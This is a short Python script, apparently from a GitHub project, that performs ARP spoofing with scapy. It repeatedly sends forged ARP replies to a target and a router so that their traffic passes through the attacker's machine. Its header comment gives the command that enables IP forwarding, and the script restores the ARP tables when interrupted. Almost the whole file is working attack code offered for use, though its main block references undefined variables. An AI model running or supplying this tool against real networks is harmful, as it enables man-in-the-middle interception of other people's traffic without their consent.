#!/usr/bin/env python
# 
# echo 1 > /proc/sys/net/ipv4/ip_forward    #to enable ip forwarding through linux machine
# print(list.show())
# print(list.summary())
# 
# 
# Code to spoof ARP tables
# This code needs two dependencies: scapy, time and sys
# You need a linux system
# for more documentation visit my github page: github.com/secbot01
# pull requests, always welcome
# code published under MIT LICENSE
#           
#               code contributed by: @nibrasmuhamed and @muhammednahil on Github
#                       


#!/usr/bin/env python

from __future__ import print_function
import scapy.all as scapy
import time


buffer_size = 0 

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    boradcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_braodcast = boradcast / arp_request
    answered_list = scapy.srp(arp_request_braodcast, timeout=1, verbose=False, iface="wlan0")[0]
    if answered_list:
        return answered_list[0][1].hwsrc

def spoof(taget_ip, spoof_ip):
    target_mac = get_mac(taget_ip)
    if not target_mac:
        with open('/tmp/net_fetch_arp.log', 'w', buffer_size) as f:
            f.write("MAC not found\n")
    else:
        packet= scapy.ARP(op=2,pdst = taget_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip , source_ip):
    destination_mac= get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def arp_try(target_ip, router_ip):  
    try:
        packet_count = 0
        while True:
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            packet_count = packet_count + 2
            with open('/tmp/net_fetch_arp.log', 'w', buffer_size) as f:
                f.write("Packet send "+ str(packet_count)+"\n")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+]Detected CTRL^C....Resetting ARP Tables.....Please wait:)\n")
        restore(target_ip, router_ip)
        restore(router_ip, target_ip)

if __name__ == "__main__":
   arp_try(target_ip , router_ip)